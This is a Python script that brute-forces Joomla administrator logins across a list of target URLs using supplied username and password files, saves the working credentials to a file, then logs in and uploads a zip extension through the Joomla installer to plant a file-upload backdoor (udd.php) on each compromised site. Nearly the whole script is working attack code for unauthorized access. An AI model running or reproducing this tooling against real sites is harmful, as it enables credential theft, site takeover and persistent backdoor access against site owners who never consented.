#!/usr/bin/python
import mechanize
import sys

if sys.argv[1] == "-h":
    print " usage:\n \n \t joompa.py username.txt password.txt\n \n"
else:

    error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
    sussuc = "Control Panel"
    joomla = "form-login"
    br = mechanize.Browser()
    br.set_handle_robots(False)
    fopen = open("/root/scanner/t.txt", "r")
    username = open(sys.argv[1])
    passw = open(sys.argv[2])
    userlist = username.readlines()
    passlist = passw.readlines()
    credintial = []
    thefile = '/root/scanner/uploader.zip'
    thetarget = open('/root/scanner/target2.txt', 'r')
    credintial = open("/root/scanner/credintial.txt")

    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'



    for line in fopen.readlines():
        logged = False
        #print bcolors.BOLD + line.strip()

        try:
            page = br.open(line.strip(), timeout=5)
            #print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line

        except:
            print bcolors.WARNING + "Error ocurred"
            pass

        try:
            mainpage = br.response().read()
            if joomla in mainpage:
                print bcolors.OKBLUE + "login found: " + line
                for form in br.forms():
                    for u in userlist:
                        if logged == False:
                            for p in passlist:
                                try:
                                    br.select_form(nr=0)
                                    #print bcolors.UNDERLINE + "\n" + line + "trying user: %s and password: %s \n" % (u, p)
                                    br.form["username"] = u
                                    br.form["passwd"] = p
                                    br.submit()
                                    readingPage = br.response().read()
                                    if sussuc in readingPage:
                                        logged = True
                                        print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
                                        print "Adding the Credential information to a new list file call (target.txt)......"
                                        print "Adding the url to a file call (target2.txt)......"
                                        target = open('target.txt', 'a')
                                        target2 = open('target2.txt', 'a')
                                        #credintial = open('credintial.txt', 'a')
                                        target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
                                        target2.write(line)

                                        users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt",
                                                          "r")
                                        password_file = open(
                                            "/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
                                        br = mechanize.Browser()
                                        thefile = '/root/scanner/uploader.zip'
                                        thetarget = open('/root/scanner/target2.txt', 'r')
                                        credintial = open("/root/scanner/credintial.txt")

                                        print "uploading the uploader:"

                                        for i in thetarget.readlines():
                                            f = i.strip() + "/index.php?option=com_installer"
                                            br2 = br.open(f)

                                            br.select_form(nr=0)
                                            br.form["username"] = "administrator"
                                            br.form["passwd"] = "123456"
                                            br.submit()
                                            readingPage = br.response().code
                                            if readingPage == 200:
                                                print "login success"

                                            for form in br.forms():
                                                continue
                                            br.select_form(nr=0)
                                            br.form.set_all_readonly(False)
                                            br.form["installtype"] = "upload"
                                            br.form.add_file(open(thefile, 'r'), 'application/zip', 'uploader.zip')
                                            br.submit()

                                            print "the uploader has been upload, and the new url is: " + i.strip() + "\b\b\b\b\b\b\b\b\b\b\b\b\b\bmodules/mod_simplefileuploadv1.3/elements/udd.php"
                                        target.close()
                                        target2.close()
                                        # credintial.close()



                                    else:
                                        #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
                                        continue
                                except:
                                    pass

            else:
                #print bcolors.UNDERLINE + "no login page found!!"
                continue
        except:
            pass
    passw.close()
    username.close()
    fopen.close()
